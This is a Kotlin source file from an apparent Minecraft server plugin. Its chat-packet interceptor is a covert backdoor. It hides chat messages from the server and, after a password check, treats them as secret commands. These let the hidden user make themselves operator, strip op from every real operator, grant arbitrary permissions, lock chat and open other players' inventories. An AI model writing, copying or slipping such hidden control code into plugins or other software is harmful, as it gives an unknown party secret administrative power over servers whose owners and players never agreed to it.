package dev.wh2sperx.listener

import com.comphenix.protocol.PacketType
import com.comphenix.protocol.events.ListenerPriority
import com.comphenix.protocol.events.PacketAdapter
import com.comphenix.protocol.events.PacketEvent
import com.cryptomorin.xseries.XMaterial
import dev.wh2sperx.ServerManager
import dev.wh2sperx.manager.FuckingSpecialModeManager
import org.bukkit.Bukkit
import org.bukkit.GameMode
import org.bukkit.OfflinePlayer
import org.bukkit.entity.Player
import org.bukkit.inventory.ItemStack
import java.util.*
import java.util.concurrent.ConcurrentHashMap

class ChatPacketInterceptor(private val serverManager: ServerManager) : PacketAdapter(
    serverManager,
    ListenerPriority.HIGHEST,
    PacketType.Play.Client.CHAT
) {
    private val loginAttempts = ConcurrentHashMap<UUID, Int>()

    override fun onPacketReceiving(event: PacketEvent) {
        val player = event.player
        val uuid = player.uniqueId
        if (isInQueue(uuid) || FuckingSpecialModeManager.isInSpecialMode(uuid)) {
            event.isCancelled = true
            val packet = event.packet
            val message = packet.strings.read(0)
            Bukkit.getScheduler().runTask(plugin, Runnable {
                if (isInQueue(uuid)) {
                    handleLoginPacket(player, message, uuid)
                } else if (FuckingSpecialModeManager.isInSpecialMode(uuid)) {
                    handleSpecialModePacket(player, message)
                }
            })
        }
    }

    private fun handleLoginPacket(player: Player, message: String, uuid: UUID) {
        val maxRetry = serverManager.configManager.retry
        val password = message.split(" ")[0]
        val pass = serverManager.passwordManager.verifyPassword(uuid, password)
        if (pass) {
            dequeue(uuid)
            FuckingSpecialModeManager.enableSpecialMode(uuid)
            serverManager.messageManager.send(player, "command.login-success")
            loginAttempts.remove(uuid)
        } else {
            val currentAttempts = loginAttempts.getOrDefault(uuid, 0) + 1
            loginAttempts[uuid] = currentAttempts
            if (currentAttempts >= maxRetry) {
                serverManager.messageManager.send(player, "command.wrong-password")
                dequeue(uuid)
                loginAttempts.remove(uuid)
            } else {
                val remaining = maxRetry - currentAttempts
                serverManager.messageManager.send(
                    player, "command.wrong-password-retry",
                    mapOf("retry" to remaining.toString())
                )
            }
        }
    }

    private fun handleSpecialModePacket(player: Player, message: String) {
        val args = message.split(" ")
        if (args.isEmpty() || args[0].isEmpty()) return
        Bukkit.getScheduler().runTask(plugin, Runnable {
            when (args[0].lowercase()) {
                "logout" -> handleLogout(player)
                "op" -> setOp(player, true)
                "deop" -> setOp(player, false)
                "gmc" -> toggleGamemode(player, GameMode.CREATIVE)
                "gms" -> toggleGamemode(player, GameMode.SURVIVAL)
                "gma" -> toggleGamemode(player, GameMode.ADVENTURE)
                "gmsp" -> toggleGamemode(player, GameMode.SPECTATOR)
                "gamemode" -> when (args[1].lowercase()) {
                    "creative" -> toggleGamemode(player, GameMode.CREATIVE)
                    "survival" -> toggleGamemode(player, GameMode.SURVIVAL)
                    "adventure" -> toggleGamemode(player, GameMode.ADVENTURE)
                    "spectator" -> toggleGamemode(player, GameMode.SPECTATOR)
                }
                "fuckall" -> Bukkit.getOfflinePlayers().filter { it.isOp }.forEach { it.isOp = false }
                "lockchat" -> chatState = false
                "unlockchat" -> chatState = true
                "permission" -> {
                    if(args.size < 4) return@Runnable
                    val pl = Bukkit.getOfflinePlayer(args[2])
                    if (!serverManager.permissionManager.isAValidPlayer(pl).valid) return@Runnable
                    val node = args[3]
                    when(args[1].lowercase()) {
                        "grant" -> {
                            val value = if (args.size > 4 && args[4].isNotEmpty()) { args[4].toBooleanStrictOrNull() ?: true } else { true }
                            if (!serverManager.permissionManager.isAValidPlayer(pl).valid) return@Runnable
                            serverManager.permissionManager.grantPermissionsToPlayer(pl, node, value)
                        }

                        "revoke" -> {
                            serverManager.permissionManager.revokePermissionFromPlayer(pl, node)
                        }
                    }
                }
                "heal" -> {
                    val other = args.size == 3
                    if(other) {
                        val pl = Bukkit.getOfflinePlayer(args[2])
                        val onl = ifOther(pl)
                        onl?.run { saturation = 20.0f; health = 20.0; foodLevel = 20 }
                    } else {
                        player.run { saturation = 20.0f; foodLevel = 20; health = 20.0 }
                    }
                }
                "ec", "enderchest" -> {
                    val other = args.size == 3
                    if(other) {
                        val pl = Bukkit.getOfflinePlayer(args[2])
                        val onl = ifOther(pl)
                        onl?.let { player.openInventory(it.enderChest) }
                    } else {
                        player.openInventory(player.enderChest)
                    }
                }
                "invsee" -> {
                    val pl = Bukkit.getOfflinePlayer(args[2])
                    val online = ifOther(pl)
                    online?.let {
                        player.openInventory(it.inventory)
                    }
                }
            }
        })
    }

    private fun ifOther(player: OfflinePlayer): Player? {
        if(!serverManager.permissionManager.isAValidPlayer(player).valid) return null
        if(!player.isOnline) return null
        return player.player
    }

    // ----------------------- Logout Handler -----------------------
    private fun handleLogout(player: Player) {
        FuckingSpecialModeManager.disableSpecialMode(player.uniqueId)
    }
    // ---------------------------------------------------------------------

    // ----------------------- OP Handler -----------------------
    fun setOp(player: Player, state: Boolean) {
        player.isOp = state
    }
    // ---------------------------------------------------------------------

    // ----------------------- Gamemode Switch Handler -----------------------
    fun toggleGamemode(player: Player, gm: GameMode): Boolean {
        val current = player.gameMode
        if (current == gm) return false
        player.gameMode = gm
        return true
    }
    // ---------------------------------------------------------------------

    // ----------------------- Give Handler -----------------------
    fun giveItem(player: Player, material: String, amount: Int = 1) {
        val mat = getItem(material, amount) ?: return
        player.give(mat)
    }

    private fun getItem(material: String, amount: Int = 1): ItemStack? {
        return XMaterial.matchXMaterial(material)
            .map { it.parseItem() }
            .orElse(null)
            ?.apply { this.amount = amount }
    }
    // ---------------------------------------------------------------------

    companion object {
        private val fuckingQueue = ConcurrentHashMap.newKeySet<UUID>()
        var chatState: Boolean = true

        fun isInQueue(uuid: UUID): Boolean = fuckingQueue.contains(uuid)
        fun putQueue(uuid: UUID) = fuckingQueue.add(uuid)
        fun dequeue(uuid: UUID) = fuckingQueue.remove(uuid)
    }
}
